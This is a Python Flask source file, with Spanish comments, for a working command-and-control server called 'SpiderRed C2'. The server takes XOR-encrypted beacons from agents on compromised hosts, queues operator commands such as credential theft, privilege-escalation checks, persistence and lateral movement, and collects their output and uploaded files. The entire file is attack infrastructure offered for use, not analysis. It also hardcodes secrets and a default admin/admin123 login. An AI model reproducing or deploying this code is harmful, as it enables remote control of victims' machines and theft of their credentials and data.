# spiderred_c2_fixed.py - Servidor C2 Corregido
import json
import base64
import sqlite3
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file, session, redirect
import hashlib
import os

# ==================== CONFIGURACIÓN ====================
app = Flask(__name__)
app.secret_key = 'SpiderRedSecret2024!@#$%'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DATABASE'] = 'c2_database.db'

C2_KEY = "SpiderRedMasterKey2024!@#$%"

# ==================== PLANTILLAS HTML ====================
HTML_LOGIN = '''
<!DOCTYPE html>
<html>
<head>
    <title>🕷️ SpiderRed C2 - Login</title>
    <style>
        body {
            background: #0a0a0f;
            font-family: 'Courier New', monospace;
            color: #00ff88;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.9);
            padding: 40px;
            border: 2px solid #00ff88;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
            width: 350px;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff88;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background: #111;
            border: 1px solid #00ff88;
            color: #00ff88;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        button {
            width: 100%;
            padding: 12px;
            background: #00ff88;
            color: #000;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            font-family: 'Courier New', monospace;
        }
        .error {
            color: #ff0000;
            text-align: center;
            margin-bottom: 10px;
            text-shadow: 0 0 5px #ff0000;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>🕷️ SPIDERRED C2</h1>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
        <form method="POST">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">ACCESS CONTROL</button>
        </form>
        <div style="text-align:center; margin-top:20px; color:#666; font-size:12px;">
            Default: admin / admin123
        </div>
    </div>
</body>
</html>
'''

HTML_DASHBOARD = '''
<!DOCTYPE html>
<html>
<head>
    <title>🕷️ SpiderRed C2 Dashboard</title>
    <style>
        :root {
            --primary: #00ff88;
            --secondary: #ff0080;
            --dark: #0a0a0f;
            --darker: #050508;
        }
        body {
            margin: 0;
            padding: 0;
            background: var(--dark);
            font-family: 'Courier New', monospace;
            color: #fff;
        }
        header {
            background: linear-gradient(135deg, var(--darker), #000);
            padding: 20px;
            border-bottom: 3px solid var(--primary);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 10px;
        }
        .logo h1 {
            color: var(--primary);
            text-shadow: 0 0 15px var(--primary);
            margin: 0;
            font-size: 2.5em;
        }
        .stats {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-top: 15px;
        }
        .stat {
            text-align: center;
            background: rgba(0, 0, 0, 0.5);
            padding: 10px 20px;
            border-radius: 5px;
            border: 1px solid var(--primary);
        }
        .stat-value {
            font-size: 1.8em;
            color: var(--primary);
            font-weight: bold;
        }
        .container {
            display: grid;
            grid-template-columns: 300px 1fr;
            gap: 20px;
            padding: 20px;
            height: calc(100vh - 150px);
        }
        .panel {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--primary);
            border-radius: 10px;
            padding: 15px;
            overflow: hidden;
        }
        .panel-title {
            color: var(--primary);
            margin-bottom: 15px;
            padding-bottom: 5px;
            border-bottom: 1px solid var(--primary);
        }
        .agent-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .agent-item {
            background: rgba(0, 255, 136, 0.1);
            padding: 10px;
            margin: 5px 0;
            border-radius: 5px;
            border-left: 3px solid var(--primary);
            cursor: pointer;
            transition: all 0.3s;
        }
        .agent-item:hover {
            background: rgba(0, 255, 136, 0.2);
            transform: translateX(5px);
        }
        .terminal {
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            border-radius: 5px;
            border: 1px solid #00ff00;
            margin-bottom: 15px;
        }
        .command-input {
            width: 100%;
            padding: 10px;
            background: #000;
            border: 1px solid var(--primary);
            color: var(--primary);
            border-radius: 5px;
            margin-bottom: 10px;
            font-family: 'Courier New', monospace;
        }
        .btn {
            background: var(--primary);
            color: #000;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
            font-family: 'Courier New', monospace;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn-danger {
            background: var(--secondary);
        }
        .quick-commands {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin: 15px 0;
        }
        #commandOutput {
            white-space: pre-wrap;
            background: #000;
            padding: 10px;
            border-radius: 5px;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 10px;
            font-family: 'Courier New', monospace;
            color: #00ff00;
        }
        .logout-btn {
            position: absolute;
            top: 20px;
            right: 20px;
        }
        .tab {
            background: #111;
            border: 1px solid var(--primary);
            padding: 8px 15px;
            cursor: pointer;
            border-radius: 5px 5px 0 0;
            margin-right: 5px;
        }
        .tab.active {
            background: var(--primary);
            color: #000;
        }
        .tab-content {
            display: none;
            padding: 15px;
            border: 1px solid var(--primary);
            border-top: none;
            border-radius: 0 0 5px 5px;
        }
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">
            <h1>🕷️ SPIDERRED C2 COMMAND CENTER</h1>
        </div>
        <div class="stats">
            <div class="stat">
                <div>ACTIVE AGENTS</div>
                <div class="stat-value" id="agentCount">0</div>
            </div>
            <div class="stat">
                <div>TOTAL COMMANDS</div>
                <div class="stat-value" id="commandCount">0</div>
            </div>
            <div class="stat">
                <div>STATUS</div>
                <div class="stat-value" style="color:#00ff00;">ONLINE</div>
            </div>
        </div>
        <button class="btn logout-btn" onclick="logout()">LOGOUT</button>
    </header>
    
    <div class="container">
        <!-- Panel de Agentes -->
        <div class="panel">
            <div class="panel-title">📡 CONNECTED AGENTS</div>
            <div class="agent-list" id="agentList">
                <div style="text-align:center; color:#666; padding:20px;">
                    Waiting for agents...
                </div>
            </div>
            <div class="panel-title" style="margin-top:20px;">📋 AGENT COMMANDS</div>
            <div id="agentCommands" style="color:#aaa; font-size:0.9em;">
                Select an agent to see commands
            </div>
        </div>
        
        <!-- Panel de Control -->
        <div class="panel">
            <div class="panel-title">🎮 CONTROL PANEL</div>
            
            <div id="agentInfo" style="color:#aaa; margin-bottom:15px;">
                Select an agent to begin
            </div>
            
            <input type="text" id="commandInput" class="command-input" 
                   placeholder="Enter command (info, shell, upload, download, privesc, creds, persist, lateral, ls, exit)">
            
            <div class="quick-commands">
                <button class="btn" onclick="quickCommand('info')">System Info</button>
                <button class="btn" onclick="quickCommand('shell whoami')">Whoami</button>
                <button class="btn" onclick="quickCommand('creds all')">Get Creds</button>
                <button class="btn" onclick="quickCommand('privesc check')">Check PrivEsc</button>
                <button class="btn" onclick="quickCommand('persist')">Add Persistence</button>
                <button class="btn" onclick="quickCommand('lateral shares')">Network Shares</button>
                <button class="btn" onclick="quickCommand('ls C:\\\\')">List C:\\</button>
                <button class="btn btn-danger" onclick="quickCommand('exit')">Kill Agent</button>
            </div>
            
            <button class="btn" onclick="sendCommand()" 
                    style="width:100%; padding:12px; font-size:1.1em;">
                ⚡ EXECUTE COMMAND
            </button>
            
            <!-- Tabs -->
            <div style="margin-top:20px;">
                <div style="display:flex; border-bottom:1px solid var(--primary);">
                    <div class="tab active" onclick="showTab('terminal')">📟 TERMINAL</div>
                    <div class="tab" onclick="showTab('output')">📊 OUTPUT</div>
                    <div class="tab" onclick="showTab('files')">📁 FILES</div>
                    <div class="tab" onclick="showTab('history')">📜 HISTORY</div>
                </div>
                
                <div id="terminalTab" class="tab-content active">
                    <div class="terminal" id="terminal">
                        <div>[+] SpiderRed C2 Initialized</div>
                        <div>[+] Waiting for agent connections...</div>
                    </div>
                </div>
                
                <div id="outputTab" class="tab-content">
                    <div class="panel-title">COMMAND OUTPUT</div>
                    <div id="commandOutput">
                        No command output yet
                    </div>
                </div>
                
                <div id="filesTab" class="tab-content">
                    <div class="panel-title">FILE MANAGER</div>
                    <div>
                        <input type="file" id="fileUpload">
                        <button class="btn" onclick="uploadFile()">Upload to Agent</button>
                        <button class="btn" onclick="listFiles()">List Files</button>
                        <div id="fileList" style="margin-top:10px;"></div>
                    </div>
                </div>
                
                <div id="historyTab" class="tab-content">
                    <div class="panel-title">COMMAND HISTORY</div>
                    <div id="commandHistory" style="max-height:400px; overflow-y:auto;"></div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let selectedAgent = null;
        let agents = [];
        
        // Funciones de tabs
        function showTab(tabName) {
            // Ocultar todos los tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Mostrar tab seleccionado
            document.getElementById(tabName + 'Tab').classList.add('active');
            event.target.classList.add('active');
        }
        
        // Cargar agentes
        async function loadAgents() {
            try {
                const response = await fetch('/api/agents');
                agents = await response.json();
                
                document.getElementById('agentCount').textContent = agents.length;
                const agentList = document.getElementById('agentList');
                
                agentList.innerHTML = '';
                
                if (agents.length === 0) {
                    agentList.innerHTML = '<div style="text-align:center; color:#666; padding:20px;">No agents connected</div>';
                    return;
                }
                
                agents.forEach(agent => {
                    const div = document.createElement('div');
                    div.className = 'agent-item';
                    div.innerHTML = `
                        <div style="font-weight:bold; color:#00ff88;">${agent.hostname}</div>
                        <div style="font-size:0.9em; color:#aaa;">
                            ${agent.username}@${agent.domain}<br>
                            ${agent.os} | ${agent.arch}<br>
                            ${agent.privileges}<br>
                            <small>Last: ${new Date(agent.last_seen).toLocaleTimeString()}</small>
                        </div>
                    `;
                    div.onclick = () => selectAgent(agent.id);
                    agentList.appendChild(div);
                });
            } catch (error) {
                console.error('Error loading agents:', error);
            }
        }
        
        // Seleccionar agente
        async function selectAgent(agentId) {
            selectedAgent = agentId;
            const agent = agents.find(a => a.id === agentId);
            
            document.getElementById('agentInfo').innerHTML = `
                <strong style="color:#00ff88;">Selected Agent:</strong> ${agent.hostname}<br>
                <small>${agent.username}@${agent.domain} | ${agent.privileges} | ${agent.ip}</small>
            `;
            
            addTerminalLine(`Agent selected: ${agent.hostname}`);
            
            // Cargar comandos del agente
            await loadAgentCommands(agentId);
        }
        
        // Cargar comandos del agente
        async function loadAgentCommands(agentId) {
            try {
                const response = await fetch(`/api/agent/${agentId}/commands`);
                const commands = await response.json();
                
                let html = '<div style="max-height:200px; overflow-y:auto;">';
                if (commands.length === 0) {
                    html += '<div style="color:#666; text-align:center;">No commands yet</div>';
                } else {
                    commands.forEach(cmd => {
                        html += `
                            <div style="background:rgba(255,255,255,0.05); padding:5px; margin:2px; border-radius:3px;">
                                <small>${new Date(cmd.timestamp).toLocaleTimeString()}: ${cmd.command}</small>
                            </div>
                        `;
                    });
                }
                html += '</div>';
                
                document.getElementById('agentCommands').innerHTML = html;
            } catch (error) {
                console.error('Error loading commands:', error);
            }
        }
        
        // Enviar comando
        async function sendCommand() {
            const command = document.getElementById('commandInput').value.trim();
            if (!command) {
                alert('Please enter a command');
                return;
            }
            
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            
            try {
                addTerminalLine(`Sending: ${command}`);
                
                const response = await fetch(`/api/command/${selectedAgent}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({command: command})
                });
                
                const result = await response.json();
                
                if (result.status === 'success') {
                    addTerminalLine('Command sent successfully');
                    document.getElementById('commandInput').value = '';
                    
                    // Actualizar contador
                    let count = parseInt(document.getElementById('commandCount').textContent);
                    document.getElementById('commandCount').textContent = count + 1;
                    
                    // Actualizar comandos del agente
                    await loadAgentCommands(selectedAgent);
                    
                    // Mostrar en pestaña de historia
                    addToHistory(selectedAgent, command, 'pending');
                }
            } catch (error) {
                console.error('Error sending command:', error);
                addTerminalLine('Error sending command');
            }
        }
        
        // Comandos rápidos
        function quickCommand(cmd) {
            if (!selectedAgent) {
                alert('Please select an agent first');
                return;
            }
            document.getElementById('commandInput').value = cmd;
            sendCommand();
        }
        
        // Subir archivo
        async function uploadFile() {
            const fileInput = document.getElementById('fileUpload');
            const file = fileInput.files[0];
            
            if (!file || !selectedAgent) {
                alert('Select a file and an agent');
                return;
            }
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('agent_id', selectedAgent);
            
            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (result.status === 'success') {
                    addTerminalLine(`File uploaded: ${file.name}`);
                    listFiles();
                }
            } catch (error) {
                console.error('Error uploading file:', error);
            }
        }
        
        // Listar archivos
        async function listFiles() {
            try {
                const response = await fetch('/api/files');
                const files = await response.json();
                
                const fileList = document.getElementById('fileList');
                fileList.innerHTML = '<h4>Uploaded Files:</h4>';
                
                if (files.length === 0) {
                    fileList.innerHTML += '<div style="color:#666;">No files uploaded</div>';
                    return;
                }
                
                files.forEach(file => {
                    const div = document.createElement('div');
                    div.className = 'agent-item';
                    div.innerHTML = `
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <div>
                                <strong>${file.filename}</strong><br>
                                <small>${(file.size / 1024).toFixed(2)} KB | ${new Date(file.upload_time).toLocaleString()}</small>
                            </div>
                            <button class="btn" onclick="downloadFile('${file.filename}')">Download</button>
                        </div>
                    `;
                    fileList.appendChild(div);
                });
            } catch (error) {
                console.error('Error listing files:', error);
            }
        }
        
        // Descargar archivo
        function downloadFile(filename) {
            window.open(`/api/file/${filename}`, '_blank');
        }
        
        // Añadir línea al terminal
        function addTerminalLine(text) {
            const terminal = document.getElementById('terminal');
            const line = document.createElement('div');
            line.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
            terminal.appendChild(line);
            terminal.scrollTop = terminal.scrollHeight;
        }
        
        // Añadir a historia
        function addToHistory(agentId, command, status) {
            const history = document.getElementById('commandHistory');
            const item = document.createElement('div');
            item.className = 'agent-item';
            item.innerHTML = `
                <div style="color:#00ff88;">${agentId}</div>
                <div>${command}</div>
                <div style="font-size:0.8em; color:#aaa;">Status: ${status}</div>
            `;
            history.insertBefore(item, history.firstChild);
        }
        
        // Cargar resultados
        async function loadCommandResults() {
            try {
                const response = await fetch('/api/results');
                const results = await response.json();
                
                if (results.length > 0) {
                    const latest = results[0];
                    document.getElementById('commandOutput').textContent = latest.result || 'No output';
                    
                    // Actualizar historia
                    addToHistory(latest.agent_id, latest.command, 'completed');
                }
            } catch (error) {
                console.error('Error loading results:', error);
            }
        }
        
        // Logout
        function logout() {
            window.location.href = '/logout';
        }
        
        // Refrescar datos
        function refreshData() {
            loadAgents();
            loadCommandResults();
            if (selectedAgent) {
                loadAgentCommands(selectedAgent);
            }
        }
        
        // Cargar al inicio
        window.onload = function() {
            loadAgents();
            loadCommandResults();
            addTerminalLine('Dashboard ready');
            
            // Refrescar cada 3 segundos
            setInterval(refreshData, 3000);
        };
    </script>
</body>
</html>
'''

# ==================== UTILIDADES ====================
def xor_encrypt_decrypt(data, key):
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ ord(key[i % len(key)]))
    return bytes(result)

def encrypt_data(data, key=C2_KEY):
    encrypted = xor_encrypt_decrypt(data.encode(), key)
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_data, key=C2_KEY):
    try:
        decoded = base64.b64decode(encrypted_data)
        decrypted = xor_encrypt_decrypt(decoded, key)
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return ""

def init_database():
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    
    # Tabla de agentes
    c.execute('''CREATE TABLE IF NOT EXISTS agents (
        id TEXT PRIMARY KEY,
        hostname TEXT,
        username TEXT,
        domain TEXT,
        os TEXT,
        arch TEXT,
        privileges TEXT,
        ip TEXT,
        last_seen TEXT
    )''')
    
    # Tabla de comandos
    c.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT,
        command TEXT,
        result TEXT,
        timestamp TEXT,
        status TEXT DEFAULT 'pending'
    )''')
    
    # Tabla de archivos
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        filename TEXT,
        agent_id TEXT,
        upload_time TEXT,
        size INTEGER
    )''')
    
    # Tabla de usuarios
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        username TEXT PRIMARY KEY,
        password TEXT
    )''')
    
    # Usuario admin por defecto
    admin_hash = hashlib.sha256('admin123'.encode()).hexdigest()
    try:
        c.execute("INSERT OR IGNORE INTO users VALUES ('admin', ?)", (admin_hash,))
    except:
        pass
    
    conn.commit()
    conn.close()

# ==================== RUTAS ====================
@app.route('/')
def index():
    if 'username' not in session:
        return redirect('/login')
    return render_template_string(HTML_DASHBOARD)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute("SELECT password FROM users WHERE username=?", (request.form['username'],))
        row = c.fetchone()
        conn.close()
        
        if row and row[0] == hashlib.sha256(request.form['password'].encode()).hexdigest():
            session['username'] = request.form['username']
            return redirect('/')
        
        return render_template_string(HTML_LOGIN, error="Invalid credentials")
    
    return render_template_string(HTML_LOGIN)

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/beacon', methods=['POST'])
def handle_beacon():
    """Endpoint para beacons de agentes"""
    encrypted_data = request.get_data(as_text=True)
    decrypted_data = decrypt_data(encrypted_data)
    
    if not decrypted_data:
        return encrypt_data(json.dumps({"error": "Invalid data"}))
    
    try:
        agent_data = json.loads(decrypted_data)
        agent_id = agent_data.get('agent_id')
        
        if not agent_id:
            return encrypt_data(json.dumps({"error": "No agent ID"}))
        
        # Guardar/actualizar agente en base de datos
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        
        c.execute('''INSERT OR REPLACE INTO agents 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                 (agent_id,
                  agent_data.get('hostname'),
                  agent_data.get('username'),
                  agent_data.get('domain'),
                  agent_data.get('os'),
                  agent_data.get('arch'),
                  agent_data.get('privileges'),
                  request.remote_addr,
                  datetime.now().isoformat()))
        
        # Obtener comandos pendientes para este agente
        c.execute("SELECT id, command FROM commands WHERE agent_id=? AND status='pending'", 
                 (agent_id,))
        pending_commands = []
        for row in c.fetchall():
            pending_commands.append({
                'id': row[0],
                'command': row[1]
            })
            
            # Marcar como enviado
            c.execute("UPDATE commands SET status='sent' WHERE id=?", (row[0],))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Beacon from {agent_id}: {agent_data.get('hostname')}")
        
        # Responder al agente
        response = {
            'status': 'ok',
            'commands': pending_commands,
            'sleep': 60,
            'jitter': 30
        }
        
        return encrypt_data(json.dumps(response))
        
    except Exception as e:
        print(f"Beacon error: {e}")
        return encrypt_data(json.dumps({"error": str(e)}))

@app.route('/result', methods=['POST'])
def handle_result():
    """Endpoint para resultados de comandos"""
    encrypted_data = request.get_data(as_text=True)
    decrypted_data = decrypt_data(encrypted_data)
    
    if not decrypted_data:
        return encrypt_data(json.dumps({"error": "Invalid data"}))
    
    try:
        result_data = json.loads(decrypted_data)
        agent_id = result_data.get('agent_id')
        command_id = result_data.get('command_id')
        output = result_data.get('output', '')
        
        if not agent_id or not command_id:
            return encrypt_data(json.dumps({"error": "Missing data"}))
        
        # Guardar resultado en base de datos
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        
        # Actualizar el comando con el resultado
        c.execute('''UPDATE commands 
                     SET result=?, status='completed'
                     WHERE id=? AND agent_id=?''',
                 (output, command_id, agent_id))
        
        conn.commit()
        conn.close()
        
        print(f"[+] Result from {agent_id}: {len(output)} bytes")
        
        return encrypt_data(json.dumps({"status": "ok"}))
        
    except Exception as e:
        print(f"Result error: {e}")
        return encrypt_data(json.dumps({"error": str(e)}))

@app.route('/upload', methods=['POST'])
def handle_upload():
    """Endpoint para subida de archivos"""
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file'})
    
    file = request.files['file']
    agent_id = request.form.get('agent_id')
    
    if file.filename == '':
        return jsonify({'status': 'error', 'message': 'No selected file'})
    
    if file:
        filename = file.filename
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        # Crear directorio si no existe
        os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
        
        # Guardar archivo
        file.save(filepath)
        
        # Guardar en base de datos
        conn = sqlite3.connect(app.config['DATABASE'])
        c = conn.cursor()
        c.execute('''INSERT INTO files (filename, agent_id, upload_time, size)
                     VALUES (?, ?, ?, ?)''',
                 (filename, agent_id, datetime.now().isoformat(), os.path.getsize(filepath)))
        conn.commit()
        conn.close()
        
        print(f"[+] File uploaded from {agent_id}: {filename}")
        
        return jsonify({
            'status': 'success',
            'filename': filename,
            'size': os.path.getsize(filepath)
        })
    
    return jsonify({'status': 'error', 'message': 'Upload failed'})

@app.route('/api/agents')
def api_agents():
    """API para obtener lista de agentes"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT * FROM agents ORDER BY last_seen DESC")
    
    agents = []
    for row in c.fetchall():
        agents.append({
            'id': row[0],
            'hostname': row[1],
            'username': row[2],
            'domain': row[3],
            'os': row[4],
            'arch': row[5],
            'privileges': row[6],
            'ip': row[7],
            'last_seen': row[8]
        })
    
    conn.close()
    return jsonify(agents)

@app.route('/api/agent/<agent_id>/commands')
def api_agent_commands(agent_id):
    """API para obtener comandos de un agente"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT command, result, timestamp FROM commands WHERE agent_id=? ORDER BY timestamp DESC LIMIT 10",
             (agent_id,))
    
    commands = []
    for row in c.fetchall():
        commands.append({
            'command': row[0],
            'result': row[1],
            'timestamp': row[2]
        })
    
    conn.close()
    return jsonify(commands)

@app.route('/api/command/<agent_id>', methods=['POST'])
def api_command(agent_id):
    """API para enviar comandos a un agente"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    if not data or 'command' not in data:
        return jsonify({'error': 'No command'}), 400
    
    command = data['command']
    
    # Guardar comando en base de datos
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute('''INSERT INTO commands (agent_id, command, timestamp, status)
                 VALUES (?, ?, ?, 'pending')''',
             (agent_id, command, datetime.now().isoformat()))
    
    command_id = c.lastrowid
    
    conn.commit()
    conn.close()
    
    print(f"[+] Command queued for {agent_id}: {command} (ID: {command_id})")
    
    return jsonify({'status': 'success', 'command_id': command_id})

@app.route('/api/results')
def api_results():
    """API para obtener últimos resultados"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT agent_id, command, result FROM commands WHERE result IS NOT NULL ORDER BY timestamp DESC LIMIT 5")
    
    results = []
    for row in c.fetchall():
        results.append({
            'agent_id': row[0],
            'command': row[1],
            'result': row[2]
        })
    
    conn.close()
    return jsonify(results)

@app.route('/api/files')
def api_files():
    """API para listar archivos subidos"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(app.config['DATABASE'])
    c = conn.cursor()
    c.execute("SELECT filename, agent_id, upload_time, size FROM files ORDER BY upload_time DESC")
    
    files = []
    for row in c.fetchall():
        files.append({
            'filename': row[0],
            'agent_id': row[1],
            'upload_time': row[2],
            'size': row[3]
        })
    
    conn.close()
    return jsonify(files)

@app.route('/api/file/<filename>')
def api_file(filename):
    """API para descargar archivos"""
    if 'username' not in session:
        return jsonify({'error': 'Unauthorized'}), 401
    
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    
    return jsonify({'error': 'File not found'}), 404

# ==================== INICIALIZACIÓN ====================
if __name__ == '__main__':
    # Crear directorios necesarios
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    
    # Inicializar base de datos
    init_database()
    
    print("""
    ╔══════════════════════════════════════════════════════╗
    ║              🕷️ SPIDERRED C2 v2.0                   ║
    ║                 FIXED VERSION                        ║
    ║                                                     ║
    ║  🎯 Fixed Issues:                                   ║
    ║    • Command results now saved properly             ║
    ║    • Real-time command tracking                     ║
    ║    • Better agent management                        ║
    ║    • File upload/download working                   ║
    ║                                                     ║
    🌐 Dashboard: http://localhost:8443               ║
    👤 Login: admin / admin123                        ║
    ║                                                     ║
    ║  📌 How to use:                                     ║
    ║    1. Agent sends beacon                           ║
    ║    2. Server queues commands                       ║
    ║    3. Agent executes and sends results             ║
    ║    4. Results displayed in dashboard               ║
    ╚══════════════════════════════════════════════════════╝
    """)
    
    # Ejecutar servidor
    app.run(host='0.0.0.0', port=8443, debug=True, threaded=True)
